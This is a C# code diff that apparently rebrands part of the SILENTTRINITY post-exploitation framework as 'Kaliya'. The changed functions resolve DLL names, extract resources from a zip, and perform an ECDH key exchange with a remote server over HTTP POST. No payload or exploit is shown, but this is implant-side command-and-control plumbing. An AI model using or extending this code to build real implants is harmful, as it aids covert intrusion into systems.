@@ -4,29 +4,28 @@ using System.IO.Compression;
 using System.Text;
 using System.Text.RegularExpressions;
 using Org.BouncyCastle.Math;
-using SILENTTRINITY.Utilities.Crypto;
+using Kaliya.Crypto;
+using Kaliya.Utils;
 
-namespace SILENTTRINITY.Utilities
+namespace Kaliya
 {
-    public static class Internals
+    internal static class Core
     {
         public static string GetDLLName(string name)
         {
             string dllName = name + ".dll";
-
             if (name.IndexOf(',') > 0)
             {
                 dllName = name.Substring(0, name.IndexOf(',')) + ".dll";
             }
-
             return dllName;
         }
 
-        public static byte[] GetResourceInZip(ZipStorer zip, string resourceName)
+        public static byte[] GetResourceInZip(ZipStorer zip, string name)
         {
             foreach (var entry in zip.ReadCentralDir())
             {
-                if (entry.FilenameInZip == resourceName)
+                if (entry.FilenameInZip == name)
                 {
                     var resdata = new byte[entry.FileSize];
                     zip.ExtractFile(entry, out resdata);
@@ -50,12 +49,12 @@ namespace SILENTTRINITY.Utilities
         static ECDeffieHellman GetECDeffieHellmanCrypto(Uri uri)
         {
             var crypto = new ECDeffieHellman();
-            var publicKey = crypto.PublicKey;
+            var publicKey = crypto.PublicKey.Q.Normalize();
 
             // Really ugly, I know, but we're trying to reduce extra dependencies...
             string json = string.Format("{{'x': \"{0}\",'y': \"{1}\"}}",
-                    publicKey.Q.Normalize().AffineXCoord,
-                    publicKey.Q.Normalize().AffineYCoord
+                    publicKey.AffineXCoord,
+                    publicKey.AffineYCoord
                 );
 
             string response = Encoding.UTF8.GetString(Http.Post(uri,
@@ -68,8 +67,8 @@ namespace SILENTTRINITY.Utilities
 
             crypto.GenerateServerPublicKey(new KeyCoords
             {
-                X = new BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", "")),
-                Y = new BigInteger(mcy)
+                x = new BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", "")),
+                y = new BigInteger(mcy)
             });
 
             return crypto;
